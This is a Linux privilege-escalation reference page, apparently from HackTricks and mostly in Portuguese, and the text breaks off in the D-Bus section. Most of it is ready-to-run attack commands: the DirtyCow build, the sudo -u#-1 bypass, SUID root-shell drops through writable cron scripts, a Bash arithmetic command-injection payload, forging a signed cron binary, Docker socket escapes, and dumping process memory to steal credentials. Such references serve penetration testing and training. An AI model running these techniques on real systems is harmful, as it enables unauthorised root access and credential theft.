# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informações do Sistema

### Informações do SO

Vamos começar a obter algum conhecimento sobre o SO em execução
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Se você **possui permissão de escrita em qualquer diretório dentro da variável `PATH`**, pode ser capaz de sequestrar algumas bibliotecas ou binários:
```bash
echo $PATH
```
### Informações do ambiente

Informações interessantes, senhas ou chaves de API nas variáveis de ambiente?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Verifique a versão do kernel e se existe algum exploit que possa ser usado para escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Você pode encontrar uma boa lista de kernels vulneráveis e alguns **exploits já compilados** aqui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Outros sites onde você pode encontrar alguns **exploits já compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extrair todas as versões do kernel vulneráveis desse site você pode fazer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Ferramentas que podem ajudar a procurar exploits de kernel são:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (executar NO alvo; apenas verifica exploits para kernel 2.x)

Sempre **pesquise a versão do kernel no Google**, talvez sua versão do kernel esteja mencionada em algum exploit de kernel e assim você terá certeza de que esse exploit é válido.

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Escalada de privilégios no Linux - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo versão

Com base nas versões vulneráveis do sudo que aparecem em:
```bash
searchsploit sudo
```
Você pode verificar se a versão do sudo é vulnerável usando este grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Versões do sudo anteriores a 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permitem que usuários locais sem privilégios escalem suas permissões para root via opção sudo `--chroot` quando o arquivo `/etc/nsswitch.conf` é usado a partir de um diretório controlado pelo usuário.

Aqui está um [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explorar essa [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de executar o exploit, certifique-se de que a sua versão do `sudo` é vulnerável e que ela suporta o recurso `chroot`.

Para mais informações, consulte o [aviso de vulnerabilidade](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: verificação da assinatura falhou

Confira **smasher2 box of HTB** para um **exemplo** de como esta vuln poderia ser explorada
```bash
dmesg 2>/dev/null | grep "signature"
```
### Mais enumeração do sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar possíveis defesas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Se você estiver dentro de um docker container, pode tentar escapar dele:


{{#ref}}
docker-security/
{{#endref}}

## Unidades

Verifique **o que está montado e desmontado**, onde e por quê. Se algo estiver desmontado, você pode tentar montá-lo e verificar por informações privadas
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binários úteis
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Além disso, verifique se **algum compilador está instalado**. Isto é útil se você precisar usar algum kernel exploit, pois é recomendado compilá-lo na máquina onde você vai usá-lo (ou em uma similar).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerável Instalado

Verifique a **versão dos pacotes e serviços instalados**. Talvez exista alguma versão antiga do Nagios (por exemplo) que possa ser explorada para escalar privilégios…\
Recomenda-se verificar manualmente a versão do software instalado que pareça mais suspeito.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se você tiver acesso SSH à máquina, também pode usar **openVAS** para verificar se há software instalado desatualizado e vulnerável na máquina.

> [!NOTE] > _Observe que estes comandos exibirão muita informação que na maioria das vezes será inútil; portanto, recomenda-se usar aplicações como OpenVAS ou similares que verifiquem se alguma versão de software instalada é vulnerável a exploits conhecidos_

## Processes

Dê uma olhada em **quais processos** estão sendo executados e verifique se algum processo possui **mais privilégios do que deveria** (talvez um tomcat sendo executado como root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Também verifique seus privilégios sobre os binários dos processos, talvez você consiga sobrescrever algum.

### Process monitoring

Você pode usar ferramentas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorar processos. Isso pode ser muito útil para identificar processos vulneráveis sendo executados frequentemente ou quando um conjunto de requisitos é atendido.

### Process memory

Alguns serviços de um servidor salvam **credenciais em texto claro dentro da memória**.\
Normalmente você vai precisar de **privilégios de root** para ler a memória de processos que pertencem a outros usuários, portanto isso geralmente é mais útil quando você já é root e quer descobrir mais credenciais.\
No entanto, lembre-se que **como um usuário normal você pode ler a memória dos processos que possui**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script do GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Para um dado PID, **maps mostram como a memória é mapeada dentro do espaço de endereçamento virtual desse processo**; também mostram as **permissões de cada região mapeada**. O pseudo-arquivo **mem** **expõe a própria memória do processo**. Do arquivo **maps** sabemos quais **regiões de memória são legíveis** e seus deslocamentos. Usamos essa informação para **seek into the mem file and dump all readable regions** para um arquivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornece acesso à memória **física** do sistema, não à memória virtual. O espaço de endereços virtual do kernel pode ser acessado usando /dev/kmem.\
Tipicamente, `/dev/mem` só é legível por **root** e pelo grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para linux

ProcDump é uma reimaginação para Linux da clássica ferramenta ProcDump da suíte Sysinternals para Windows. Disponível em [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Ferramentas

Para fazer um dump da memória de um processo, você pode usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Você pode remover manualmente os requisitos de root e fazer o dump do processo que você possui
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root é necessário)

### Credenciais da Memória do Processo

#### Exemplo manual

Se você descobrir que o processo authenticator está em execução:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Você pode dump the process (veja as seções anteriores para encontrar diferentes maneiras de dump the memory of a process) e procurar por credentials dentro da memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

A ferramenta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) irá **roubar credenciais em texto claro da memória** e de alguns **arquivos bem conhecidos**. Requer privilégios root para funcionar corretamente.

| Recurso                                           | Nome do processo     |
| ------------------------------------------------- | -------------------- |
| Senha do GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Conexões FTP ativas)                      | vsftpd               |
| Apache2 (Sessões HTTP Basic Auth ativas)          | apache2              |
| OpenSSH (Sessões SSH ativas - Uso do sudo)        | sshd:                |

#### Expressões regulares de busca/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Se um painel web “Crontab UI” (alseambusher/crontab-ui) estiver rodando como root e estiver ligado apenas ao loopback, você ainda pode alcançá‑lo via SSH local port-forwarding e criar um job privilegiado para escalar privilégios.

Typical chain
- Descobrir porta acessível apenas em loopback (ex.: 127.0.0.1:8000) e o realm do Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
- Encontrar credenciais em artefatos operacionais:
  - Backups/scripts com `zip -P <password>`
  - unidade systemd expondo `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Túnel e login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crie um job com privilégios elevados e execute-o imediatamente (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Use-o:
```bash
/tmp/rootshell -p   # root shell
```
Endurecimento
- Não execute o Crontab UI como root; restrinja com um usuário dedicado e permissões mínimas
- Faça bind em localhost e restrinja adicionalmente o acesso via firewall/VPN; não reutilize senhas
- Evite embutir secrets em unit files; use secret stores ou EnvironmentFile somente para root
- Habilite audit/logging para on-demand job executions

Verifique se algum scheduled job é vulnerável. Talvez você consiga aproveitar um script executado por root (wildcard vuln? pode modificar arquivos que root usa? usar symlinks? criar arquivos específicos no diretório que root usa?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Caminho do Cron

Por exemplo, dentro de _/etc/crontab_ você pode encontrar o PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observe como o usuário "user" tem privilégios de escrita sobre /home/user_)

Se dentro deste crontab o usuário root tentar executar algum comando ou script sem definir o PATH. Por exemplo: _\* \* \* \* root overwrite.sh_\

Então, você pode obter um shell root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando um script com um wildcard (Wildcard Injection)

Se um script é executado por root e tem um “**\***” dentro de um comando, você pode explorar isso para causar comportamentos inesperados (como privesc). Exemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se o wildcard for precedido por um caminho como** _**/some/path/***_**, não é vulnerável (mesmo** _**./***_ **não é).**

Leia a página a seguir para mais truques de exploração de wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

O Bash realiza parameter expansion e command substitution antes da arithmetic evaluation em ((...)), $((...)) e let. Se um cron/parser rodando como root lê campos de log não confiáveis e os insere em um contexto aritmético, um atacante pode injetar uma command substitution $(...) que é executada como root quando o cron roda.

- Por que funciona: No Bash, as expansões ocorrem nesta ordem: parameter/variable expansion, command substitution, arithmetic expansion, depois word splitting e pathname expansion. Então um valor como `$(/bin/bash -c 'id > /tmp/pwn')0` é primeiro substituído (executando o comando), depois o restante numérico `0` é usado na aritmética para que o script continue sem erros.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Faça com que texto controlado pelo atacante seja escrito no log parseado de forma que o campo com aparência numérica contenha uma command substitution e termine com um dígito. Garanta que seu comando não escreva em stdout (ou redirecione) para que a aritmética permaneça válida.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Se você **puder modificar um cron script** executado por root, você pode obter um shell muito facilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se o script executado por root usa um **diretório onde você tem acesso total**, talvez seja útil apagar essa pasta e **criar um symlink para outra pasta que execute um script controlado por você**
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Binários cron assinados customizados com payloads graváveis
Blue teams às vezes "assinam" binários acionados por cron fazendo dump de uma seção ELF customizada e greppando por uma vendor string antes de executá-los como root. Se esse binário for group-writable (ex.: `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) e você puder leak o signing material, você pode forjar a seção e sequestrar a tarefa do cron:

1. Use `pspy` para capturar o fluxo de verificação. Em Era, root executou `objcopy --dump-section .text_sig=text_sig_section.bin monitor` seguido por `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` e então executou o arquivo.
2. Recrie o certificado esperado usando a chave/config vazadas (de `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Construa um substituto malicioso (ex.: drop um SUID bash, adicione sua SSH key) e incorpore o certificado em `.text_sig` para que o grep passe:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Sobrescreva o binário agendado preservando os bits de execução:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Aguarde a próxima execução do cron; uma vez que a verificação de assinatura ingênua tenha sucesso, seu payload será executado como root.

### Frequent cron jobs

Você pode monitorar os processos para procurar processos que estão sendo executados a cada 1, 2 ou 5 minutos. Talvez você possa tirar proveito disso e escalar privilégios.

Por exemplo, para **monitorar a cada 0.1s durante 1 minuto**, **ordenar pelos comandos menos executados** e deletar os comandos que foram executados com mais frequência, você pode fazer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Você também pode usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (isto irá monitorar e listar todo processo que inicia).

### Cron jobs invisíveis

É possível criar um cronjob **colocando um carriage return depois de um comentário** (sem caractere de nova linha), e o cronjob funcionará. Exemplo (observe o caractere carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Serviços

### Arquivos _.service_ graváveis

Verifique se você pode escrever em algum arquivo `.service`, se puder, você **poderia modificá‑lo** de modo que **execute** seu **backdoor quando** o serviço for **iniciado**, **reiniciado** ou **parado** (talvez você precise esperar até que a máquina seja reiniciada).\
Por exemplo, crie seu backdoor dentro do arquivo .service com **`ExecStart=/tmp/script.sh`**

### Binários de serviço graváveis

Tenha em mente que, se você tem **permissão de escrita sobre binários executados por serviços**, você pode alterá‑los para backdoors de forma que, quando os serviços sejam reexecutados, os backdoors sejam executados.

### systemd PATH - Caminhos relativos

Você pode ver o PATH usado pelo **systemd** com:
```bash
systemctl show-environment
```
Se você descobrir que pode **escrever** em qualquer uma das pastas do caminho, pode ser capaz de **escalate privileges**. Você precisa procurar por **caminhos relativos sendo usados em arquivos de configuração de serviços** como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Então, crie um **executável** com o **mesmo nome do binário do caminho relativo** dentro da pasta do PATH do systemd em que você consegue gravar, e quando o serviço for solicitado a executar a ação vulnerável (**Start**, **Stop**, **Reload**), seu **backdoor será executado** (usuários não privilegiados geralmente não podem start/stop serviços, mas verifique se você pode usar `sudo -l`).

**Saiba mais sobre serviços com `man systemd.service`.**

## **Timers**

**Timers** são arquivos de unidade do systemd cujo nome termina em `**.timer**` e que controlam arquivos ou eventos `**.service**`. **Timers** podem ser usados como alternativa ao cron, pois têm suporte integrado para eventos de tempo de calendário e eventos de tempo monotônicos, e podem ser executados de forma assíncrona.

Você pode enumerar todos os timers com:
```bash
systemctl list-timers --all
```
### Temporizadores graváveis

Se você puder modificar um temporizador, pode fazê-lo executar algumas unidades existentes de systemd.unit (como uma `.service` ou uma `.target`)
```bash
Unit=backdoor.service
```
Na documentação você pode ler o que é a Unit:

> A unidade a ser ativada quando este timer expirar. O argumento é um nome de unidade, cujo sufixo não é ".timer". Se não for especificado, esse valor assume por padrão um serviço (.service) com o mesmo nome da unidade timer, exceto pelo sufixo. (Veja acima.) Recomenda-se que o nome da unidade que é ativada e o nome da unidade do timer sejam idênticos, exceto pelo sufixo.

Portanto, para abusar dessa permissão você precisaria:

- Encontrar alguma unit do systemd (como uma `.service`) que esteja **executando um binário gravável**
- Encontrar alguma unit do systemd que esteja **executando um caminho relativo** e sobre a qual você tenha **privilégios de escrita** no **PATH do systemd** (para se passar por esse executável)

**Saiba mais sobre timers com `man systemd.timer`.**

### **Ativar Timer**

Para ativar um timer você precisa de privilégios root e executar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Observe que o **timer** é **ativado** criando um symlink para ele em `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permitem a **comunicação entre processos** na mesma máquina ou em máquinas diferentes dentro de modelos cliente-servidor. Eles utilizam arquivos de descritor Unix padrão para comunicação entre computadores e são configurados através de arquivos `.socket`.

Sockets podem ser configurados usando arquivos `.socket`.

**Saiba mais sobre sockets com `man systemd.socket`.** Dentro deste arquivo, vários parâmetros interessantes podem ser configurados:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Essas opções são diferentes, mas, em resumo, são usadas para **indicar onde vai escutar** o socket (o caminho do arquivo de socket AF_UNIX, o IPv4/6 e/ou número da porta para escuta, etc.)
- `Accept`: Recebe um argumento booleano. Se **true**, uma **instância do service é criada para cada conexão entrante** e apenas o socket da conexão é passado para ela. Se **false**, todos os sockets de escuta são **passados para a unidade de service iniciada**, e apenas uma unidade de service é criada para todas as conexões. Esse valor é ignorado para sockets datagrama e FIFOs, onde uma única unidade de service lida incondicionalmente com todo o tráfego entrante. **Padrão: false**. Por razões de desempenho, recomenda-se escrever novos daemons apenas de forma compatível com `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Aceitam uma ou mais linhas de comando, que são **executadas antes** ou **depois** que os **sockets**/FIFOs de escuta sejam **criados** e vinculados, respectivamente. O primeiro token da linha de comando deve ser um nome de arquivo absoluto, seguido pelos argumentos do processo.
- `ExecStopPre`, `ExecStopPost`: Comandos adicionais que são **executados antes** ou **depois** que os **sockets**/FIFOs de escuta sejam **fechados** e removidos, respectivamente.
- `Service`: Especifica o nome da unidade de **service** a **ativar** no **tráfego entrante**. Essa configuração só é permitida para sockets com Accept=no. Por padrão, aponta para o service que tem o mesmo nome que o socket (com o sufixo substituído). Na maioria dos casos, não deve ser necessário usar essa opção.

### Writable .socket files

Se você encontrar um arquivo `.socket` **gravável**, você pode **adicionar** no início da seção `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` e o backdoor será executado antes do socket ser criado. Portanto, você **provavelmente precisará aguardar até que a máquina seja reiniciada.**\
_Observe que o sistema deve estar usando essa configuração do arquivo de socket ou o backdoor não será executado_

### Writable sockets

Se você **identificar qualquer socket gravável** (_agora estamos falando sobre Unix Sockets e não sobre os arquivos de configuração `.socket`_), então **você pode se comunicar** com esse socket e talvez explorar uma vulnerabilidade.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Conexão raw
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemplo de exploração:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Observe que pode haver alguns **sockets listening for HTTP** requests (_não estou falando sobre .socket files mas os arquivos que atuam como unix sockets_). Você pode verificar isso com:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Se o socket **responder com uma requisição HTTP**, então você pode **comunicar-se** com ele e talvez **exploit alguma vulnerabilidade**.

### Docker Socket Gravável

O Docker socket, frequentemente encontrado em `/var/run/docker.sock`, é um arquivo crítico que deve ser protegido. Por padrão, ele é gravável pelo usuário `root` e pelos membros do grupo `docker`. Possuir acesso de escrita a esse socket pode levar a privilege escalation. Abaixo está um detalhamento de como isso pode ser feito e métodos alternativos caso o Docker CLI não esteja disponível.

#### **Privilege Escalation com Docker CLI**

Se você tiver acesso de escrita ao Docker socket, você pode escalate privileges usando os seguintes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Esses comandos permitem que você execute um container com acesso de nível root ao sistema de arquivos do host.

#### **Usando Docker API Diretamente**

Em casos onde o Docker CLI não está disponível, o docker socket ainda pode ser manipulado usando o Docker API e comandos `curl`.

1.  **List Docker Images:** Recupere a lista de imagens disponíveis.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Envie uma requisição para criar um container que monte o diretório raiz do sistema do host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to estabelecer uma conexão com o container, permitindo a execução de comandos dentro dele.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Após configurar a conexão `socat`, você pode executar comandos diretamente no container com acesso de nível root ao sistema de arquivos do host.

### Outros

Note que se você tem permissões de escrita sobre o docker socket porque está **dentro do grupo `docker`** você tem [**mais formas de escalar privilégios**](interesting-groups-linux-pe/index.html#docker-group). Se a [**docker API estiver escutando em uma porta** você também pode comprometer ela](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Confira **mais formas de escapar do docker ou abusar dele para escalar privilégios** em:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) elevação de privilégios

Se você descobrir que pode usar o **`ctr`** command, leia a página a seguir, pois **pode ser possível abusar dele para elevar privilégios**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** elevação de privilégios

Se você descobrir que pode usar o **`runc`** command, leia a página a seguir, pois **pode ser possível abusar dele para elevar privilégios**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus é um sofisticado **inter-Process Communication (IPC) system** que permite que aplicações interajam de forma eficiente e compartilhem dados. Projetado com o sistema Linux moderno em mente, oferece uma estrutura robusta para diferentes formas de comunicação entre aplicações.

O sistema é versátil, suportando IPC básico que melhora a troca de dados entre processos, lembrando **enhanced UNIX domain sockets**. Além disso, ajuda a transmitir eventos ou sinais, promovendo integração entre componentes do sistema. Por exemplo, um sinal de um daemon Bluetooth sobre uma chamada entrante pode fazer um player de música silenciar, melhorando a experiência do usuário. Adicionalmente, D-Bus suporta um sistema de objetos remotos, simplificando solicitações de serviço e invocações de métodos entre aplicações, agilizando processos que tradicionalmente eram complexos.

D-Bus opera em um **allow/deny model**, gerenciando permissões de mensagens (chamadas de método, emissão de sinais, etc.) com base no efeito cumulativo de regras de política que correspondem. Essas políticas especificam interações com o bus, potencialmente permitindo elevação de privilégios através da exploração dessas permissões.

Um exemplo de tal política em `/etc/dbus-1/system.d/wpa_supplicant.conf` é fornecido, detalhando permissões para o usuário root possuir, enviar e receber mensagens de `fi.w1.wpa_supplicant1`.

Políticas sem um usuário ou grupo especificado se aplicam universalmente, enquanto políticas de contexto "default" se aplicam a todos não cobertos por outras políticas específicas.
```xml
